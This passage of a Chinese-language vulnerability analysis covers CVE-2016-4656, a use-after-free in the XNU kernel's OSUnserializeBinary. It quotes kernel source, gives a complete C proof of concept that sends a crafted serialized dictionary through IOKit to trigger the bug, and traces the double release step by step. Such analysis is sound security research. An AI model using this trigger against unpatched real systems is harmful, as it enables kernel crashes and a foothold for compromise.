    else 
    {
    sym = OSDynamicCast(OSSymbol, o);
    if (!sym && (str = OSDynamicCast(OSString, o)))
    {
        sym = (OSSymbol *) OSSymbol::withString(str);
        o->release();
        o = 0;
    }
    ok = (sym != 0);
    }
    }
    else if (array) 
    {
    ok = array->setObject(o);
        o->release();
    }
    else if (set)
    {
       ok = set->setObject(o);
       o->release();
    }
    else
    {
        assert(!parent);
        result = o;
    }
    if (!ok) break;
    if (newCollect)
    {
    if (!end)
    {
    stackIdx++;
    setAtIndex(stack, stackIdx, parent);
    if (!ok) break;
    }
    DEBG("++stack[%d] %pn", stackIdx, parent);
    parent = o;
    dict   = newDict;
    array  = newArray;
    set    = newSet;
    end    = false;
    }
    if (end)
    {
    if (!stackIdx) break;
    parent = stackArray[stackIdx];
    DEBG("--stack[%d] %pn", stackIdx, parent);
    stackIdx--;
    set   = 0; 
    dict  = 0; 
    array = 0;
    if (!(dict = OSDynamicCast(OSDictionary, parent)))
    {
    if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));
    }
    }
    }
对reference,dict,set,array都有相应的处理分支。
**0x02 POC的分析**
**2.1 POC**
    /*
     * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH
     * compile on OS X like:
     *    gcc -arch i386 -framework IOKit -o ex exploit.c
     */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    enum
    {
      kOSSerializeDictionary   = 0x01000000U,
      kOSSerializeArray        = 0x02000000U,
      kOSSerializeSet          = 0x03000000U,
      kOSSerializeNumber       = 0x04000000U,
      kOSSerializeSymbol       = 0x08000000U,
      kOSSerializeString       = 0x09000000U,
      kOSSerializeData         = 0x0a000000U,
      kOSSerializeBoolean      = 0x0b000000U,
      kOSSerializeObject       = 0x0c000000U,
      kOSSerializeTypeMask     = 0x7F000000U,
      kOSSerializeDataMask     = 0x00FFFFFFU,
      kOSSerializeEndCollecton = 0x80000000U,
    };
    #define kOSSerializeBinarySignature "323"
    int main()
    {
      char * data = malloc(1024);
      uint32_t * ptr = (uint32_t *) data;
      uint32_t bufpos = 0;
      mach_port_t master = 0, res;
      kern_return_t kr;
      /* create header */
      memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
      bufpos += sizeof(kOSSerializeBinarySignature);
      /* create a dictionary with 2 elements */
      *(uint32_t *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | 2; bufpos += 4;
      /* our key is a OSString object */
      *(uint32_t *)(data+bufpos) = kOSSerializeString | 7; bufpos += 4;
      *(uint32_t *)(data+bufpos) = 0x41414141; bufpos += 4;
      *(uint32_t *)(data+bufpos) = 0x00414141; bufpos += 4;
      /* our data is a simple boolean */
      *(uint32_t *)(data+bufpos) = kOSSerializeBoolean | 64; bufpos += 4;
      /* now create a reference to object 1 which is the OSString object that was just freed */
      *(uint32_t *)(data+bufpos) = kOSSerializeObject | 1; bufpos += 4;
      /* get a master port for IOKit API */
      host_get_io_master(mach_host_self(), &master);
      /* trigger the bug */
      kr = io_service_get_matching_services_bin(master, data, bufpos, &res);
      printf("kr: 0x%xn", kr);
    }
很明显，poc创建了一个dict，这个dict有两个元素，第一个元素是key为“AAAAAAA”的字符串，值为一个Boolean。第二个元素是第一个元素的一个reference。
内核在反序列化这一段字符串的时候就会触发漏洞。
crash
结合OSUnserializeBinary，来分析一下，到底发生了一些什么。
**2.2 流程**
****
**2.2.1 kOSSerializeDictionary**
通过解析，二进制文件首先会进入kOSSerializeDictionary的分支。
    case kOSSerializeDictionary:
    o = newDict = OSDictionary::withCapacity(len);
    newCollect = (len != 0);
           break;
    break之后，执行setAtIndex宏。
    objsArray[0] = dict
因为其他条件都不满足，代码会进入处理新容器的分支。
    if (newCollect)
    {
    if (!end)
    {
    stackIdx++;
    setAtIndex(stack, stackIdx, parent);
    if (!ok) break;
    }
    DEBG("++stack[%d] %pn", stackIdx, parent);
    parent = o;
    dict   = newDict;
    array  = newArray;
    set    = newSet;
    end    = false;
    }
从而给dict赋值newDict。从而创建了一个dict用来存储后续的数据。
**2.2.2 kOSSerializeString与kOSSerializeBoolean**
第一个元素的key是一个字符串，通过源码解析。
    case kOSSerializeString:
    bufferPos += (wordLen * sizeof(uint32_t));
    if (bufferPos > bufferSize) break;
            o = OSString::withStringOfLength((const char *) next, len);
            next += wordLen;
            break;
获得字符串o。
break之后，执行setAtIndex宏。
objsArray[0] = dict
objsArray[1] = "0x0041414141414141"
因为dict已经创建，进入dict的处理流程。
    if (dict)
    {
    if (sym)
    {
    DEBG("%s = %sn", sym->getCStringNoCopy(), o->getMetaClass()->getClassName());
    if (o != dict) 
    {
    ok = dict->setObject(sym, o);
    }
    o->release();
    sym->release();
    sym = 0;
    }
    else 
    {
    sym = OSDynamicCast(OSSymbol, o);//release();
        o = 0;
    }
    ok = (sym != 0);
    }
    }
因为sym并不存在，所以根据o转换出sym。
第一个元素的值是一个bool值，
    case kOSSerializeBoolean:
    o = (len ? kOSBooleanTrue : kOSBooleanFalse);
            break;
break之后，执行setAtIndex宏。
objsArray[0] => dict
objsArray[1] => "0x0041414141414141"
objsArray[2] => true//不知道是不是true，瞎写的，这里不重要
再次进入dict的处理分支，
    if (dict)
    {
    if (sym)//getCStringNoCopy(), o->getMetaClass()->getClassName());
    if (o != dict) 
    {
    ok = dict->setObject(sym, o);
    }
    o->release();//objsArrays[2]指向o
    sym->release();//objsArrays[1]指向sym
    sym = 0;
    }
    else 
    {
    sym = OSDynamicCast(OSSymbol, o);
    if (!sym && (str = OSDynamicCast(OSString, o)))
    {
        sym = (OSSymbol *) OSSymbol::withString(str);
        o->release();
        o = 0;
    }
    ok = (sym != 0);
    }
    }
因为sym已经存在了，所以进入了上面的分支，在处理完成之后，对o和sym都进行了release。
objsArray[0] => dict
objsArray[1] => "0x0041414141414141"//released
objsArray[2] => true //released
**2.2.3 kOSSerializeObject**
第二个元素的是一个reference，处理的代码如下。
      case kOSSerializeObject:
    if (len >= objsIdx) break;
    o = objsArray[len];//len的值为1
    o->retain();
    isRef = true;
    break;
o取出数组中objsArray[1],是一个已经被释放了的元素。
再通过dict处理的代码时
//如果存在一个解析出来的dict
    if (dict)
    {
    if (sym)
    {
    DEBG("%s = %sn", sym->getCStringNoCopy(), o->getMetaClass()->getClassName());
    if (o != dict) 
    {
    ok = dict->setObject(sym, o);
    }
    o->release();
    sym->release();
    sym = 0;
    }
    else 
    {
    sym = OSDynamicCast(OSSymbol, o);
    if (!sym && (str = OSDynamicCast(OSString, o)))
    {
        sym = (OSSymbol *) OSSymbol::withString(str);
        o->release();//再次调用o的release函数，出发UAF。
        o = 0;